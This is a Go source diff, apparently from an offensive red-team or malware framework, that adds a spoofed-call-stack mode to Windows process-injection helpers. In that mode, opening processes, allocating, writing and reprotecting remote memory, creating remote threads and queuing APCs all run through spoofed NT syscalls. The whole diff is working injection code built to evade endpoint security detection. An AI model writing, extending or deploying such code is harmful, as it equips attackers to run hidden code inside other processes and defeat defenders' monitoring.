@@ -23,6 +23,7 @@ var (
 	procReadProcessMemoryHelper *syscall.LazyProc
 	procVirtualProtectX         *syscall.LazyProc
 	initInjectionHelpers        sync.Once
+	apiSpoofEnabled             bool // when true, use spoofed-stack syscalls for injection APIs
 )
 
 func ensureInjectionHelpers() {
@@ -33,9 +34,22 @@ func ensureInjectionHelpers() {
 	})
 }
 
+// SetAPISpoofEnabled enables or disables spoofed-stack dispatch for injection APIs.
+func SetAPISpoofEnabled(enabled bool) {
+	apiSpoofEnabled = enabled
+}
+
 // injectOpenProcess opens a process handle, using indirect syscalls when available.
 func injectOpenProcess(desiredAccess uint32, pid uint32) (uintptr, error) {
 	ensureInjectionHelpers()
+	if apiSpoofEnabled && APISpoofAvailable() {
+		var handle uintptr
+		status := SpoofedNtOpenProcess(&handle, desiredAccess, uintptr(pid))
+		if status != 0 {
+			return 0, fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
+		}
+		return handle, nil
+	}
 	if IndirectSyscallsAvailable() {
 		var handle uintptr
 		status := IndirectNtOpenProcess(&handle, desiredAccess, uintptr(pid))
@@ -53,6 +67,10 @@ func injectOpenProcess(desiredAccess uint32, pid uint32) (uintptr, error) {
 
 // injectCloseHandle closes a handle, using indirect syscalls when available.
 func injectCloseHandle(handle uintptr) {
+	if apiSpoofEnabled && APISpoofAvailable() {
+		SpoofedNtClose(handle)
+		return
+	}
 	if IndirectSyscallsAvailable() {
 		IndirectNtClose(handle)
 		return
@@ -63,6 +81,16 @@ func injectCloseHandle(handle uintptr) {
 // injectAllocMemory allocates memory in a remote process.
 func injectAllocMemory(hProcess uintptr, size int, protect uint32) (uintptr, error) {
 	ensureInjectionHelpers()
+	if apiSpoofEnabled && APISpoofAvailable() {
+		var addr uintptr
+		regionSize := uintptr(size)
+		status := SpoofedNtAllocateVirtualMemory(hProcess, &addr, &regionSize,
+			MEM_COMMIT|MEM_RESERVE, protect)
+		if status != 0 {
+			return 0, fmt.Errorf("memory allocation failed: NTSTATUS 0x%X", status)
+		}
+		return addr, nil
+	}
 	if IndirectSyscallsAvailable() {
 		var addr uintptr
 		regionSize := uintptr(size)
@@ -87,6 +115,15 @@ func injectWriteMemory(hProcess, addr uintptr, data []byte) (int, error) {
 		return 0, nil
 	}
 	ensureInjectionHelpers()
+	if apiSpoofEnabled && APISpoofAvailable() {
+		var bytesWritten uintptr
+		status := SpoofedNtWriteVirtualMemory(hProcess, addr,
+			uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)), &bytesWritten)
+		if status != 0 {
+			return 0, fmt.Errorf("memory write failed: NTSTATUS 0x%X", status)
+		}
+		return int(bytesWritten), nil
+	}
 	if IndirectSyscallsAvailable() {
 		var bytesWritten uintptr
 		status := IndirectNtWriteVirtualMemory(hProcess, addr,
@@ -154,6 +191,17 @@ func injectReadMemoryInto(hProcess, addr uintptr, buf unsafe.Pointer, size int) 
 // injectProtectMemory changes memory protection in a remote process.
 func injectProtectMemory(hProcess, addr uintptr, size int, protect uint32) (uint32, error) {
 	ensureInjectionHelpers()
+	if apiSpoofEnabled && APISpoofAvailable() {
+		protectAddr := addr
+		protectSize := uintptr(size)
+		var oldProtect uint32
+		status := SpoofedNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
+			protect, &oldProtect)
+		if status != 0 {
+			return 0, fmt.Errorf("memory protection change failed: NTSTATUS 0x%X", status)
+		}
+		return oldProtect, nil
+	}
 	if IndirectSyscallsAvailable() {
 		protectAddr := addr
 		protectSize := uintptr(size)
@@ -196,6 +244,14 @@ func injectAllocWriteProtect(hProcess uintptr, data []byte, finalProtect uint32)
 // injectCreateRemoteThread creates a remote thread in a process, using indirect syscalls when available.
 func injectCreateRemoteThread(hProcess, startAddr uintptr) (uintptr, error) {
 	ensureInjectionHelpers()
+	if apiSpoofEnabled && APISpoofAvailable() {
+		var hThread uintptr
+		status := SpoofedNtCreateThreadEx(&hThread, hProcess, startAddr)
+		if status != 0 {
+			return 0, fmt.Errorf("remote thread creation failed: NTSTATUS 0x%X", status)
+		}
+		return hThread, nil
+	}
 	if IndirectSyscallsAvailable() {
 		var hThread uintptr
 		status := IndirectNtCreateThreadEx(&hThread, hProcess, startAddr)
@@ -230,6 +286,13 @@ func injectOpenThread(desiredAccess uint32, tid uint32) (uintptr, error) {
 
 // injectQueueAPC queues a user APC to a thread, using indirect syscalls when available.
 func injectQueueAPC(hThread, funcAddr uintptr) error {
+	if apiSpoofEnabled && APISpoofAvailable() {
+		status := SpoofedNtQueueApcThread(hThread, funcAddr, 0, 0, 0)
+		if status != 0 {
+			return fmt.Errorf("APC queue failed: NTSTATUS 0x%X", status)
+		}
+		return nil
+	}
 	if IndirectSyscallsAvailable() {
 		status := IndirectNtQueueApcThread(hThread, funcAddr, 0, 0, 0)
 		if status != 0 {
